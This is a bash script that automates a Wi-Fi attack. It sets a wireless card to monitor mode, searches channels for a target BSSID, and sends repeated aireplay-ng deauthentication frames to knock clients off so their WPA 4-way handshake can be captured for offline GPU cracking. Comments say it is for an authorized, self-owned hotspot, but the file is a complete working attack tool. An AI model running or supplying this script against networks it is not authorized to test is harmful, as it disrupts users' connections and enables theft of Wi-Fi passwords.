#!/bin/bash
# Robust locate + 4-way-handshake capture on an AUTHORIZED hotspot (own gear only).
# Capture ONLY — cracking happens on the Mac GPU (crack-mac.sh). Usage: grab.sh [BSSID]
B="${1:-AA:BB:CC:DD:EE:FF}"; IF=wlan0; FORCECH="${2:-}"
sudo pkill -9 airodump-ng aireplay-ng 2>/dev/null; sleep 1
sudo rm -f /tmp/cap* /tmp/loc* 2>/dev/null
sudo ip link set $IF down 2>/dev/null; sudo iw dev $IF set type monitor 2>/dev/null; sudo ip link set $IF up 2>/dev/null

# WARM the radio (rtl8xxxu reports 0 APs / sees nothing on a cold start until an injection test wakes it)
sudo iw dev $IF set channel 6 2>/dev/null; sudo timeout 10 aireplay-ng --test $IF >/dev/null 2>&1

# locate the AP's channel — or use a forced channel if given (2nd arg) to skip the flaky scan
if [ -n "$FORCECH" ]; then
  CH="$FORCECH"
else
  CH=""
  for ch in 6 1 11 2 3 4 5 7 8 9 10 12 13; do
    sudo iw dev $IF set channel "$ch" 2>/dev/null
    sudo timeout 4 airodump-ng -c "$ch" --bssid "$B" $IF -w /tmp/loc --output-format csv >/dev/null 2>&1
    C=$(grep -i "$B" /tmp/loc-01.csv 2>/dev/null | awk -F, '{gsub(/ /,"",$4); if($4+0>0){print $4; exit}}')
    sudo rm -f /tmp/loc-01.csv 2>/dev/null
    [ -n "$C" ] && { CH=$C; break; }
  done
  [ -z "$CH" ] && { echo "RESULT=AP_NOT_FOUND (hotspot off / out of range)"; exit 0; }
fi
echo "AP channel $CH"
sudo iw dev $IF set channel "$CH" 2>/dev/null

# capture + deauth any connected client to force a fast re-handshake
sudo airodump-ng -c "$CH" --bssid "$B" -w /tmp/cap $IF >/dev/null 2>&1 &
AD=$!; sleep 4
for r in $(seq 1 12); do
  CL=$(awk -F, -v b="$B" 'f{gsub(/ /,"",$1);gsub(/ /,"",$6); if(toupper($6)==toupper(b) && $1 ~ /^([0-9A-Fa-f]{2}:){5}/) print $1} /Station MAC/{f=1}' /tmp/cap-01.csv 2>/dev/null)
  if [ -n "$CL" ]; then for c in $CL; do sudo timeout 3 aireplay-ng --deauth 3 -a "$B" -c "$c" $IF >/dev/null 2>&1; done
  else sudo timeout 2 aireplay-ng --deauth 2 -a "$B" $IF >/dev/null 2>&1; fi
  sleep 4
  sudo aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -q "1 handshake" && { echo "GOT handshake at round $r (clients: $CL)"; break; }
done
sudo kill $AD 2>/dev/null; sleep 1
if sudo aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -q "1 handshake"; then
  echo "RESULT=HANDSHAKE_CAPTURED file=/tmp/cap-01.cap"
else
  echo "RESULT=NO_HANDSHAKE clients_seen=[$(awk -F, -v b="$B" 'f{gsub(/ /,"",$1);gsub(/ /,"",$6); if(toupper($6)==toupper(b)) print $1} /Station MAC/{f=1}' /tmp/cap-01.csv 2>/dev/null | tr "\n" " ")]"
fi
